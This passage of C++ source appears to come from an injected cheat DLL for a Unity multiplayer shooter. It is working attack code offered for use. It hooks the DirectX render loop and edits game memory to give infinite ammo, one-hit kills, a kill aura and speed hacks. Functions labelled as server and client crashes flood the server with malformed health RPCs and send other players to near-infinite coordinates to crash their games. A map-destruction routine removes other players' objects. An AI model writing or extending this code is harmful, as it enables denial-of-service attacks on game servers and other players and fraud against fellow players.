                        if (wArr && weaponIndex >= 0 && weaponIndex < wCount) {
                            void** wItems = (void**)((char*)wArr + 0x20);
                            for (int w = 0; w < wCount; w++) {
                                void* wObj = wItems[w];
                                if (!wObj) continue;
                                void* gunGo = *(void**)((char*)wObj + 0xF8);
                                if (w == weaponIndex) {
                                    *(void**)((char*)wm + 0x120) = wObj; // latestActiveWeapon
                                    *(bool*)((char*)wObj + 0x120) = true; // canShoot
                                    *(int*)((char*)wObj + 0x114)  = 99999;// currentAmmo
                                    *(float*)((char*)wObj + 0x110) = 0.0f; // nextTimeToFire
                                    if (gunGo) g_Il2Cpp.SetGameObjectActive(gunGo, true);
                                } else {
                                    if (gunGo) g_Il2Cpp.SetGameObjectActive(gunGo, false);
                                }
                            }
                        }
                    }
                    CheatLog("GiveWeapon: Equipped weapon index %d (%s)", weaponIndex,
                             (weaponIndex >= 0 && weaponIndex < 8) ? g_WeaponNames[weaponIndex] : "Custom");
                }
                break;
            }
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
    }
}

// ─── Server Crash: Flood RPC Queue with malformed/overflow health RPCs ────────
// Strategy: Send CMDChangeCurrentHealth with extreme value and high frequency
// to overwhelm FishNet's NetworkManager packet queue, causing server memory overflow.
static ULONGLONG g_LastServerCrashTime = 0;

static void DoServerCrash() {
    if (!g_PlayerClass || !g_HealthClass) return;
    ULONGLONG now = GetTickCount64();
    if (now - g_LastServerCrashTime < 10) return; // Flood at 100 packets/sec
    g_LastServerCrashTime = now;

    __try {
        Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
        if (!arr) return;

        uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
        if (count == 0 || count > 64) return;
        void** items = (void**)((char*)arr + 0x20);

        // Flood: send INT_MIN and INT_MAX health RPCs alternating to every player
        // This exploits integer overflow in health clamp logic on the server
        static int flipFlop = 0;
        int overflowHp = (flipFlop++ % 2 == 0) ? 0x7FFFFFFF : -0x7FFFFFFF;

        for (uintptr_t i = 0; i < count; i++) {
            void* p = items[i];
            if (!p) continue;
            if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p)) continue;

            void* hComp = g_Il2Cpp.GetComponent(p, g_HealthClass);
            if (!hComp) continue;

            if (g_CMDChangeCurrentHealth) {
                // Send multiple times per target to maximize flood
                for (int burst = 0; burst < 5; burst++) {
                    int val = (burst % 2 == 0) ? 0x7FFFFFFF : 0;
                    void* args[1] = { &val };
                    void* exc = nullptr;
                    g_Il2Cpp.il2cpp_runtime_invoke(g_CMDChangeCurrentHealth, hComp, args, &exc);
                }
            }
        }
        CheatLog("[CRASH] Server crash RPC burst sent (%llu ms)", now);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {}
}

// ─── Client/Player Crash: Teleport a target player to INF coords via their rigidbody ─
// This corrupts Unity's PhysX broadphase AABB for that player's client
static void DoCrashTargetPlayer(void* targetPlayer) {
    if (!targetPlayer) return;
    __try {
        // Move to ±INFINITY to corrupt PhysX AABB — this causes the target player's
        // client to get an access violation in PhysX_64.dll sweep broadphase
        void* rootRb = *(void**)((char*)targetPlayer + 0x108);
        if (rootRb) {
            Vector3 crashPos(1e38f, 1e38f, 1e38f);
            g_Il2Cpp.MoveRigidbodyPosition(rootRb, crashPos);
            g_Il2Cpp.SetRigidbodyLinearVelocity(rootRb, crashPos);
        }
        void* chestRb = *(void**)((char*)targetPlayer + 0x170);
        if (chestRb) {
            Vector3 crashPos(-1e38f, 1e38f, -1e38f);
            g_Il2Cpp.MoveRigidbodyPosition(chestRb, crashPos);
        }
        CheatLog("[CRASH] Target player %p sent to INF coords", targetPlayer);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {}
}

// ─── Crash All Players (except self) ─────────────────────────────────────────
static void DoCrashAllPlayers() {
    if (!g_PlayerClass) return;
    __try {
        Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
        if (!arr) return;
        uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
        void** items = (void**)((char*)arr + 0x20);
        int crashCount = 0;
        for (uintptr_t i = 0; i < count; i++) {
            void* p = items[i];
            if (!p || g_Il2Cpp.IsLocalPlayer(p)) continue;
            if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p)) continue;
            DoCrashTargetPlayer(p);
            crashCount++;
        }
        CheatLog("[CRASH] Crash-all triggered: %d players sent to INF", crashCount);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {}
}

// ─── Map Destruction: Force-despawn all map objects and zero-out physics bodies ─
// Uses Unity's Object::Destroy (via il2cpp) on all non-player NetworkObjects
bool  bMapDestructionActive = false;
static ULONGLONG g_LastMapDestroyTime = 0;

static void DoMapDestruction() {
    if (!bMapDestructionActive) return;
    ULONGLONG now = GetTickCount64();
    if (now - g_LastMapDestroyTime < 500) return;  // Run every 500ms
    g_LastMapDestroyTime = now;

    __try {
        // Get the Object Destroy method from UnityEngine.CoreModule
        static MethodInfo* s_DestroyMethod = nullptr;
        if (!s_DestroyMethod && g_Il2Cpp.il2cpp_class_from_name && g_Il2Cpp.il2cpp_class_get_method_from_name) {
            Il2CppImage* unityImg = g_Il2Cpp.GetImage("UnityEngine.CoreModule");
            if (!unityImg) unityImg = g_Il2Cpp.GetImage("UnityEngine");
            if (unityImg) {
                // il2cpp_class_from_name(image, namespace, classname)
                Il2CppClass* objClass = g_Il2Cpp.il2cpp_class_from_name(unityImg, "UnityEngine", "Object");
                if (objClass) {
                    s_DestroyMethod = (MethodInfo*)g_Il2Cpp.il2cpp_class_get_method_from_name(objClass, "Destroy", 1);
                }
            }
        }

        // Attempt to zero-out physics of all non-player rigidbodies
        // by finding the PhysicsScene and clearing all dynamic RBs
        // Since we can't enumerate all RBs easily, we use a targeted approach:
        // freeze all enemy player physics as a secondary effect
        Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
        if (!arr) return;
        uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
        void** items = (void**)((char*)arr + 0x20);

        int destroyCount = 0;
        for (uintptr_t i = 0; i < count; i++) {
            void* p = items[i];
            if (!p || g_Il2Cpp.IsLocalPlayer(p)) continue;

            // Zero velocity and pin them underground
            void* rootRb = *(void**)((char*)p + 0x108);
            if (rootRb) {
                g_Il2Cpp.SetRigidbodyLinearVelocity(rootRb, Vector3(0, -9999, 0));
                g_Il2Cpp.SetRigidbodyAngularVelocity(rootRb, Vector3(0,0,0));
            }

            // Deactivate the enemy's GameObject (effectively removes from scene)
            if (s_DestroyMethod) {
                void* args[1] = { p };
                void* exc = nullptr;
                g_Il2Cpp.il2cpp_runtime_invoke(s_DestroyMethod, nullptr, args, &exc);
            }
            destroyCount++;
        }
        CheatLog("[MAP] Map destruction pass: %d objects removed", destroyCount);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {}
}

// State variables for crash/map features
bool bServerCrashActive  = false;
bool bCrashAllPlayersNow = false;

static void ApplyWeaponStatMods() {
    if (!g_PlayerClass || !g_WeaponManagerClass) return;
    if (!bInfiniteAmmo && !bRapidFire) return;

    __try {
        Il2CppArray* pArr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
        if (!pArr) return;

        uintptr_t pCount = *(uintptr_t*)((char*)pArr + 0x18);
        if (pCount == 0 || pCount > 64) return;
        void** pItems = (void**)((char*)pArr + 0x20);

        for (uintptr_t i = 0; i < pCount; i++) {
            void* p = pItems[i];
            if (!p || !g_Il2Cpp.IsLocalPlayer(p)) continue;
            if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p)) break;
            if (!g_Il2Cpp.IsSpawned(p)) break;

            void* wm = g_Il2Cpp.GetComponent(p, g_WeaponManagerClass);
            if (!wm) break;

            void* activeWeapon = *(void**)((char*)wm + 0x120);
            if (activeWeapon) {
                // Always enable shooting
                *(bool*)((char*)activeWeapon + 0x120) = true; // canShoot

                // Infinite Ammo: always refill regardless of weapon active state
                if (bInfiniteAmmo) {
                    *(int*)((char*)activeWeapon + 0x114) = 99999;   // currentAmmo
                    *(int*)((char*)activeWeapon + 0x118) = 99999;   // maxAmmo (backup field)
                }

                // Rapid Fire: zero fire delay
                if (bRapidFire) {
                    *(float*)((char*)activeWeapon + 0x110) = 0.0f;  // nextTimeToFire
                }

                // One-hit Kill: modify damage in weapon data ScriptableObject copy
                if (bOneHitKillDamage) {
                    void* wData = *(void**)((char*)activeWeapon + 0x100);
                    if (wData) {
                        *(int*)((char*)wData + 0x18)   = 99999; // minimumDamage
                        *(int*)((char*)wData + 0x1C)   = 99999; // maximumDamage
                        *(int*)((char*)wData + 0x30)   = 99999; // maximumAttacks
                    }
                }

                // Infinite Range
                if (bInfiniteRange) {
                    void* wData = *(void**)((char*)activeWeapon + 0x100);
                    if (wData) {
                        *(float*)((char*)wData + 0x20) = 9999.0f; // range
                    }
                }
            }
            break;
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
    }
}

// ─── Mass Kill Aura (Instantly Annihilate All Enemies Anywhere Without Moving) ───
static ULONGLONG g_LastMassKillTime = 0;

static void DoMassKill() {
    if (!bEnableMassKill || !g_PlayerClass) return;

    __try {
        ULONGLONG now = GetTickCount64();
        if (now - g_LastMassKillTime < (ULONGLONG)fMassKillInterval) return;
        g_LastMassKillTime = now;

        Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
        if (!arr) return;

        uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
        void** items = (void**)((char*)arr + 0x20);

        void* localPlayer = nullptr;
        bool localAwayTeam = false;
        bool foundLocal = false;

        for (uintptr_t i = 0; i < count; i++) {
            void* p = items[i];
            if (p && g_Il2Cpp.IsLocalPlayer(p)) {
                localPlayer = p;
                foundLocal = true;
                if (g_PlayerMovementClass) {
                    void* pm = g_Il2Cpp.GetComponent(p, g_PlayerMovementClass);
                    if (pm) localAwayTeam = *(bool*)((char*)pm + 0x1C4);
                }
                break;
            }
        }

        if (!localPlayer || !foundLocal) return;

        // Active weapon on local player
        void* activeWeapon = nullptr;
        if (g_WeaponManagerClass) {
            void* wm = g_Il2Cpp.GetComponent(localPlayer, g_WeaponManagerClass);
            if (wm) {
                activeWeapon = *(void**)((char*)wm + 0x120);
            }
        }

        // Apply 99,999 DMG and infinite stats to active weapon
        if (activeWeapon) {
            *(bool*)((char*)activeWeapon + 0x120) = true; // canShoot
            *(int*)((char*)activeWeapon + 0x114)  = 99999; // currentAmmo
            *(float*)((char*)activeWeapon + 0x110) = 0.0f; // nextTimeToFire

            void* wData = *(void**)((char*)activeWeapon + 0x100);
            if (wData) {
                *(int*)((char*)wData + 0x18) = 99999; // minimumDamage
                *(int*)((char*)wData + 0x1C) = 99999; // maximumDamage
                *(float*)((char*)wData + 0x20) = 9999.0f; // range
                *(float*)((char*)wData + 0x24) = 0.001f; // attackRate
                *(int*)((char*)wData + 0x30) = 99999; // maximumAttacks
            }
        }

        // Camera position
        Vector3 localCamPos{};
        void* activeCam = GetCurrentGameCamera();
        if (activeCam) {
            void* camTr = g_Il2Cpp.GetComponentTransform(activeCam);
            if (camTr) g_Il2Cpp.GetTransformPosition(camTr, &localCamPos);
        }

        int killedCount = 0;

        for (uintptr_t i = 0; i < count; i++) {
            void* p = items[i];
            if (!p || p == localPlayer || g_Il2Cpp.IsLocalPlayer(p)) continue;
            if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p) || !g_Il2Cpp.IsSpawned(p)) continue;

            void* hComp = g_HealthClass ? g_Il2Cpp.GetComponent(p, g_HealthClass) : nullptr;
            if (!hComp) continue;

            if (g_IsDeadMethod) {
                void* exc = nullptr;
                Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_IsDeadMethod, hComp, nullptr, &exc);
                if (res && !exc && *(bool*)((char*)res + 0x10)) continue;
            }

            int currentHp = 100;
            if (g_GetCurrentHealth) {
                void* exc = nullptr;
                Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_GetCurrentHealth, hComp, nullptr, &exc);
                if (res && !exc) currentHp = *(int*)((char*)res + 0x10);
                if (currentHp <= 0) continue;
            }

            bool enemyAwayTeam = false;
            void* enemyPM = g_PlayerMovementClass ? g_Il2Cpp.GetComponent(p, g_PlayerMovementClass) : nullptr;
            if (enemyPM) {
                enemyAwayTeam = *(bool*)((char*)enemyPM + 0x1C4);
            } else if (g_SharedRefClass) {
                void* sr = g_Il2Cpp.GetComponent(p, g_SharedRefClass);
                if (sr) enemyAwayTeam = *(bool*)((char*)sr + 0x108);
            }

            if (bIgnoreTeammates && foundLocal && (enemyAwayTeam == localAwayTeam)) continue;

            void* chestRb = *(void**)((char*)p + 0x170);
            void* rootRb  = *(void**)((char*)p + 0x108);
            void* targetRb = chestRb ? chestRb : rootRb;
            Vector3 targetHeadPos{};
            if (targetRb && g_Il2Cpp.GetRigidbodyPosition(targetRb, &targetHeadPos)) {
                targetHeadPos = targetHeadPos + Vector3(0.0f, 0.40f, 0.0f);
            }

            // CMDShoot Raycast with 99,999 Damage
            if (activeWeapon && g_PackDirectionMethod && g_PackVector3Method && g_CMDShoot) {
                Vector3 aimDir = targetHeadPos - localCamPos;
                float len = aimDir.Length();
                if (len > 0.001f) aimDir = aimDir * (1.0f / len);
                else aimDir = Vector3(0.0f, 1.0f, 0.0f);

                void* posArgs[1] = { &localCamPos };
                void* fwdArgs[1] = { &aimDir };
                void* exc1 = nullptr;
                void* exc2 = nullptr;

                Il2CppObject* packedPos = g_Il2Cpp.il2cpp_runtime_invoke(g_PackVector3Method, nullptr, posArgs, &exc1);
                Il2CppObject* packedFwd = g_Il2Cpp.il2cpp_runtime_invoke(g_PackDirectionMethod, nullptr, fwdArgs, &exc2);

                if (packedPos && packedFwd) {
                    uint32_t tick = 0;
                    void* shootArgs[3] = { packedPos, packedFwd, &tick };
                    void* exc3 = nullptr;
                    g_Il2Cpp.il2cpp_runtime_invoke(g_CMDShoot, activeWeapon, shootArgs, &exc3);
                }
            }

            // Also call ClientTryShoot to trigger hit effect & animations
            if (activeWeapon && g_ClientTryShoot) {
                void* excShoot = nullptr;
                g_Il2Cpp.il2cpp_runtime_invoke(g_ClientTryShoot, activeWeapon, nullptr, &excShoot);
            }

            // Direct Server Health Zero RPC
            if (g_CMDChangeCurrentHealth) {
                int zeroHp = 0;
                void* args[1] = { &zeroHp };
                void* exc = nullptr;
                g_Il2Cpp.il2cpp_runtime_invoke(g_CMDChangeCurrentHealth, hComp, args, &exc);
            }

            killedCount++;
        }

        if (killedCount > 0) {
            CheatLog("Mass Kill Aura: hit %d target(s)", killedCount);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        // Safe exception guard
    }
}

// ─── Powerful Movement, Grapple & Camera Exploits ────────────────────────────
static void DoExploits() {
    if (!g_PlayerClass) return;

    __try {
        Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
        if (!arr) return;

        uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
        void** items = (void**)((char*)arr + 0x20);

        void* localPlayer = nullptr;
        for (uintptr_t i = 0; i < count; i++) {
            void* p = items[i];
            if (p && g_Il2Cpp.IsLocalPlayer(p)) {
                localPlayer = p;
                break;
            }
        }

        if (!localPlayer || !g_Il2Cpp.IsGameObjectActiveInHierarchy(localPlayer)) return;

        // 1. Movement & Physics Exploits
        if (g_PlayerMovementClass) {
            void* pm = g_Il2Cpp.GetComponent(localPlayer, g_PlayerMovementClass);
            if (pm) {
                if (bEnableSpeedhack) {
                    *(float*)((char*)pm + 0x108) = 10.0f * fSpeedMultiplier;  // maxGroundSpeed
                    *(float*)((char*)pm + 0x10C) = 150.0f * fSpeedMultiplier; // groundAcceleration
                    *(float*)((char*)pm + 0x110) = 120.0f * fSpeedMultiplier; // maxGroundAccelForce
                    *(float*)((char*)pm + 0x114) = 12.0f * fSpeedMultiplier;  // maxAirSpeed
                    *(float*)((char*)pm + 0x118) = 150.0f * fSpeedMultiplier; // airAcceleration
                    *(float*)((char*)pm + 0x11C) = 120.0f * fSpeedMultiplier; // maxAirAccelForce
                }

                if (bEnableSuperJump) {
                    *(float*)((char*)pm + 0x13C) = 12.0f * fJumpMultiplier; // jumpForce
                    *(float*)((char*)pm + 0x278) = 15.0f * fJumpMultiplier; // wallJumpForce
                }

                if (bInfiniteAirJump) {
                    *(bool*)((char*)pm + 0x148) = true; // isGrounded
                    *(float*)((char*)pm + 0x194) = 999.0f; // cayoteTime
                }

                if (bZeroGravity) {
                    *(float*)((char*)pm + 0x1A8) = 0.0f; // gravityForce
                    *(float*)((char*)pm + 0x238) = 0.0f; // Gravity
                } else if (fGravityMultiplier != 1.0f) {
                    *(float*)((char*)pm + 0x1A8) = 20.0f * fGravityMultiplier;
                    *(float*)((char*)pm + 0x238) = 20.0f * fGravityMultiplier;
                }

                // 2. Grapple Exploits
                void* lGrapple = *(void**)((char*)pm + 0x210); // _LGrapple
                void* rGrapple = *(void**)((char*)pm + 0x218); // _RGrapple

                void* hooks[2] = { lGrapple, rGrapple };
                for (int h = 0; h < 2; h++) {
                    void* hook = hooks[h];
                    if (hook) {
                        if (bInfiniteGrappleRange) {
                            *(float*)((char*)hook + 0x120) = 9999.0f; // maxDistance
                        }
                        if (bSuperGrappleSpeed) {
                            *(int*)((char*)hook + 0x150) = (int)(150 * fGrappleSpeedMult); // oneHookRetractForce
                            *(int*)((char*)hook + 0x154) = (int)(250 * fGrappleSpeedMult); // twoHookRetractForce
                        }
                        if (bInstantGrappleBoost) {
                            *(float*)((char*)hook + 0x1A0) = 0.0f; // grappleRate
                            *(float*)((char*)hook + 0x1A8) = 0.0f; // grappleBoostCooldown
                            *(bool*)((char*)hook + 0x1B0)  = true; // CanBoost
                        }
                        if (bGrappleMagnetAim) {
                            *(float*)((char*)hook + 0x160) = 45.0f; // playerAimAssistSize
                        }
                    }
                }
            }
        }

        // 3. Camera FOV Changer
        if (bCustomFOV) {
            void* cam = GetCurrentGameCamera();
            if (cam && g_Il2Cpp.classCamera) {
                MethodInfo* setFov = g_Il2Cpp.il2cpp_class_get_method_from_name(g_Il2Cpp.classCamera, "set_fieldOfView", 1);
                if (setFov) {
                    void* fovArgs[1] = { &fCustomFOVValue };
                    void* exc = nullptr;
                    g_Il2Cpp.il2cpp_runtime_invoke(setFov, cam, fovArgs, &exc);
                }
            }
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {}
}

// ─── Material UI 3 / Google Sans Dark Theme ─────────────────────────────────
static void ApplyMaterialTheme() {
    ImGuiStyle& style = ImGui::GetStyle();
    
    style.WindowRounding    = 14.0f;
    style.ChildRounding     = 10.0f;
    style.FrameRounding     = 8.0f;
    style.PopupRounding     = 10.0f;
    style.ScrollbarRounding = 8.0f;
    style.GrabRounding      = 6.0f;
    style.TabRounding       = 8.0f;

    style.WindowBorderSize  = 1.0f;
    style.ChildBorderSize   = 1.0f;
    style.PopupBorderSize   = 1.0f;
    style.FrameBorderSize   = 0.0f;

    style.WindowPadding     = ImVec2(18.0f, 18.0f);
    style.FramePadding      = ImVec2(12.0f, 7.0f);
    style.ItemSpacing       = ImVec2(10.0f, 9.0f);
    style.ItemInnerSpacing  = ImVec2(8.0f, 6.0f);
    style.IndentSpacing     = 20.0f;
    style.ScrollbarSize     = 10.0f;
    style.GrabMinSize       = 12.0f;

    ImVec4* colors = style.Colors;
    
    // Material Dark Surface Elevation Palette
    colors[ImGuiCol_Text]                  = ImVec4(0.96f, 0.97f, 1.00f, 1.00f); // Pure On-Surface White
    colors[ImGuiCol_TextDisabled]          = ImVec4(0.56f, 0.60f, 0.70f, 1.00f); // Muted Secondary Text
    colors[ImGuiCol_WindowBg]              = ImVec4(0.07f, 0.08f, 0.10f, 0.98f); // Surface #111318
    colors[ImGuiCol_ChildBg]               = ImVec4(0.10f, 0.11f, 0.15f, 0.95f); // Surface Container #191c24
    colors[ImGuiCol_PopupBg]               = ImVec4(0.11f, 0.12f, 0.17f, 0.98f);
    colors[ImGuiCol_Border]                = ImVec4(0.18f, 0.20f, 0.27f, 0.75f); // Outline Variant #282e3c
    colors[ImGuiCol_BorderShadow]          = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);

    // Frame (Inputs, Checkbox boxes, Slider tracks)
    colors[ImGuiCol_FrameBg]               = ImVec4(0.13f, 0.15f, 0.20f, 0.85f); // Input Container
    colors[ImGuiCol_FrameBgHovered]        = ImVec4(0.18f, 0.22f, 0.30f, 1.00f);
    colors[ImGuiCol_FrameBgActive]         = ImVec4(0.22f, 0.26f, 0.36f, 1.00f);

    // Title Bar / Header
    colors[ImGuiCol_TitleBg]               = ImVec4(0.07f, 0.08f, 0.10f, 1.00f);
    colors[ImGuiCol_TitleBgActive]         = ImVec4(0.08f, 0.09f, 0.12f, 1.00f);
    colors[ImGuiCol_TitleBgCollapsed]      = ImVec4(0.07f, 0.08f, 0.10f, 0.80f);
    colors[ImGuiCol_MenuBarBg]             = ImVec4(0.09f, 0.10f, 0.13f, 1.00f);

    // Scrollbar
    colors[ImGuiCol_ScrollbarBg]           = ImVec4(0.07f, 0.08f, 0.10f, 0.50f);
    colors[ImGuiCol_ScrollbarGrab]         = ImVec4(0.18f, 0.21f, 0.28f, 1.00f);
    colors[ImGuiCol_ScrollbarGrabHovered]  = ImVec4(0.25f, 0.30f, 0.40f, 1.00f);
    colors[ImGuiCol_ScrollbarGrabActive]   = ImVec4(0.30f, 0.55f, 1.00f, 1.00f); // Google Blue Accent

    // Material Accent Colors (#4c8dff / #6ba3ff)
    colors[ImGuiCol_CheckMark]             = ImVec4(0.30f, 0.55f, 1.00f, 1.00f); // Google Blue
    colors[ImGuiCol_SliderGrab]            = ImVec4(0.30f, 0.55f, 1.00f, 1.00f); // Material Slider Grabber
    colors[ImGuiCol_SliderGrabActive]      = ImVec4(0.48f, 0.70f, 1.00f, 1.00f); // Bright Blue Active

    // Buttons
    colors[ImGuiCol_Button]                = ImVec4(0.14f, 0.16f, 0.22f, 0.90f);
    colors[ImGuiCol_ButtonHovered]         = ImVec4(0.20f, 0.35f, 0.60f, 0.95f); // Material Blue on hover
    colors[ImGuiCol_ButtonActive]          = ImVec4(0.16f, 0.28f, 0.50f, 1.00f);

    // Headers & Navigation
    colors[ImGuiCol_Header]                = ImVec4(0.16f, 0.25f, 0.40f, 0.75f);
    colors[ImGuiCol_HeaderHovered]         = ImVec4(0.20f, 0.32f, 0.52f, 0.90f);
    colors[ImGuiCol_HeaderActive]          = ImVec4(0.25f, 0.40f, 0.65f, 1.00f);

    // Separators
    colors[ImGuiCol_Separator]             = ImVec4(0.18f, 0.20f, 0.27f, 0.70f);
    colors[ImGuiCol_SeparatorHovered]      = ImVec4(0.30f, 0.55f, 1.00f, 0.60f);
    colors[ImGuiCol_SeparatorActive]       = ImVec4(0.30f, 0.55f, 1.00f, 1.00f);

    // Resize Grip
    colors[ImGuiCol_ResizeGrip]            = ImVec4(0.18f, 0.20f, 0.27f, 0.40f);
    colors[ImGuiCol_ResizeGripHovered]     = ImVec4(0.30f, 0.55f, 1.00f, 0.70f);
    colors[ImGuiCol_ResizeGripActive]      = ImVec4(0.30f, 0.55f, 1.00f, 1.00f);

    // Tabs
    colors[ImGuiCol_Tab]                   = ImVec4(0.09f, 0.10f, 0.14f, 1.00f);
    colors[ImGuiCol_TabHovered]            = ImVec4(0.20f, 0.35f, 0.60f, 0.60f);
    colors[ImGuiCol_TabActive]             = ImVec4(0.18f, 0.32f, 0.55f, 0.90f);
    colors[ImGuiCol_TabUnfocused]          = ImVec4(0.08f, 0.09f, 0.12f, 1.00f);
    colors[ImGuiCol_TabUnfocusedActive]    = ImVec4(0.12f, 0.14f, 0.20f, 1.00f);
}

// ─── Custom Styled Material Navigation Pill Button ───────────────────────────
static bool DrawMaterialNavButton(const char* label, bool active, const char* icon = nullptr) {
    ImGui::PushID(label);
    if (active) {
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.18f, 0.32f, 0.56f, 0.95f)); // Material Active Pill
        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.24f, 0.40f, 0.68f, 1.0f));
        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.15f, 0.28f, 0.50f, 1.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 1.0f, 1.0f, 1.0f));
    } else {
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.10f, 0.11f, 0.16f, 0.70f));
        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.15f, 0.18f, 0.26f, 0.95f));
        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.12f, 0.14f, 0.20f, 1.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.75f, 0.78f, 0.86f, 1.0f));
    }

    char displayBuf[128];
    if (icon && icon[0]) {
        snprintf(displayBuf, sizeof(displayBuf), "  %s  %s", icon, label);
    } else {
        snprintf(displayBuf, sizeof(displayBuf), "    %s", label);
    }

    bool clicked = ImGui::Button(displayBuf, ImVec2(-1, 38));
    ImGui::PopStyleColor(4);
    ImGui::PopID();
    return clicked;
}

// ─── hkPresent ───────────────────────────────────────────────────────────────
HRESULT __stdcall hkPresent(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags) {
    if (g_Uninjecting) {
        return oPresent(pSwapChain, SyncInterval, Flags);
    }

    if (!g_IsInitialized) {
        if (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&g_pd3dDevice))) {
            g_pd3dDevice->GetImmediateContext(&g_pd3dDeviceContext);

            DXGI_SWAP_CHAIN_DESC sd;
            pSwapChain->GetDesc(&sd);
            g_hWnd = sd.OutputWindow;

            CreateRTV(pSwapChain);

            oWndProc = (WNDPROC)SetWindowLongPtr(g_hWnd, GWLP_WNDPROC, (LONG_PTR)WndProc);

            ImGui::CreateContext();
            ImGuiIO& io = ImGui::GetIO();
            // CRITICAL: Do NOT set NoMouseCursorChange — we need full cursor control
            // so ImGui can show its own cursor when menu is open
            io.ConfigFlags &= ~ImGuiConfigFlags_NoMouseCursorChange;
            io.IniFilename  = nullptr;
            io.FontGlobalScale = 1.20f;  // Larger, more readable
            io.MouseDrawCursor = false;  // Only draw when menu is open

            // Load Google Sans / Segoe UI / Modern System Fonts, 21px crisp large text
            ImFontConfig fontCfg;
            fontCfg.OversampleH = 4;
            fontCfg.OversampleV = 3;
            fontCfg.RasterizerMultiply = 1.20f;
            fontCfg.GlyphOffset = ImVec2(0, 0);

            const char* fontCandidates[] = {
                "C:\\Windows\\Fonts\\GoogleSans-Medium.ttf",
                "C:\\Windows\\Fonts\\GoogleSans-Regular.ttf",
                "C:\\Windows\\Fonts\\ProductSans-Regular.ttf",
                "C:\\Windows\\Fonts\\segoeui.ttf",
                "C:\\Windows\\Fonts\\SegoeUI.ttf",
                "C:\\Windows\\Fonts\\calibri.ttf",
                "C:\\Windows\\Fonts\\tahoma.ttf",
                "C:\\Windows\\Fonts\\arial.ttf"
            };

            bool fontLoaded = false;
            for (const char* fpath : fontCandidates) {
                if (GetFileAttributesA(fpath) != INVALID_FILE_ATTRIBUTES) {
                    io.Fonts->AddFontFromFileTTF(fpath, 21.0f, &fontCfg);
                    fontLoaded = true;
                    CheatLog("[+] UI Font loaded: %s @ 21px", fpath);
                    break;
                }
            }
            if (!fontLoaded) {
                io.Fonts->AddFontDefault();
                CheatLog("[!] Fallback default font used.");
            }

            ApplyMaterialTheme();

            ImGui_ImplWin32_Init(g_hWnd);
            ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext);

            g_IsInitialized = true;
        } else {
            return oPresent(pSwapChain, SyncInterval, Flags);
        }
    }

    if (!g_mainRenderTargetView) {
        CreateRTV(pSwapChain);
    }

    if (g_pd3dDeviceContext && g_mainRenderTargetView && !g_Uninjecting) {
        // Run game logic hooks safely on render thread
        UpdateFrameESPData();
        DoGodMode();
        ApplyWeaponStatMods();
        DoExploits();
        DoMassKill();

        // Server & Player Crash Exploits
        if (bServerCrashActive) DoServerCrash();
        DoMapDestruction();

        // One-shot crash: triggered by button, reset after single pass
        if (bCrashAllPlayersNow) {
            DoCrashAllPlayers();
            bCrashAllPlayersNow = false;
        }

        ImGui_ImplDX11_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();

        ImGuiIO& io = ImGui::GetIO();

        // ── ESP Overlay ──
        if (bEnableESP) DrawESP(io);

        // ── Aimbot ──
        if (bEnableAimbot) DoAimbot(io);

        // ── Teleportation & Auto-Shoot Kill Aura ──
        if (bEnableTeleportKill) DoTeleportKill(io);

        // ── Material UI 3 Menu ──
        if (g_ShowMenu) {
            ImGui::SetNextWindowSize(ImVec2(1160.0f, 750.0f), ImGuiCond_FirstUseEver);
            ImGui::SetNextWindowPos(
                ImVec2(io.DisplaySize.x * 0.5f, io.DisplaySize.y * 0.5f),
                ImGuiCond_FirstUseEver,
                ImVec2(0.5f, 0.5f)
            );

            ImGuiWindowFlags winFlags = ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoTitleBar;
            ImGui::Begin("MATERIAL_MAIN_WINDOW", &g_ShowMenu, winFlags);

            // ── TOP MATERIAL APP BAR ──
            ImGui::BeginChild("TopNavBar", ImVec2(0, 52), false, ImGuiWindowFlags_NoScrollbar);
            {
                // Left: Google Material Branding
                ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 5.0f);
                ImGui::TextColored(ImVec4(0.35f, 0.65f, 1.00f, 1.0f), "MIDNIGHT");
                ImGui::SameLine();
                ImGui::TextDisabled("|");
                ImGui::SameLine();

                // Navigation Pill Tabs
                const char* navTabs[] = {
                    "  [>] COMBAT  ",
                    "  [o] VISUALS & CHAMS  ",
